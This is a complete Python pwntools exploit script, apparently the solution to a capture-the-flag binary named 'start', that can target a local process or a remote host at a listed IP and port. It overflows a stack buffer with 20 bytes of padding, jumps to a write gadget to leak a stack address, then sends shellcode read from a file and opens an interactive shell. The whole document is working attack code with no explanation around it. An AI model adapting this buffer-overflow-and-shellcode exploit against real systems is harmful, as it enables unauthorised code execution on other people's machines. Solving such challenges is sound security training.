#!/usr/bin/env python
from pwn import *
local = 1
if local:
    p = process('./start')
else:
    p = remote('139.162.123.119', 10000)
write = 0x8048087
# gdb.attach(p)
offset = 20
payload = 'A' * offset + p32(write)
p.sendafter('CTF:', payload)
stack = u32(p.recv(4)) + 0x10
print 'stack:', hex(stack)
sh = open('sh.bin').read()
payload = 'A' * 20 + p32(stack + 4) + sh
p.send(payload)
p.interactive()
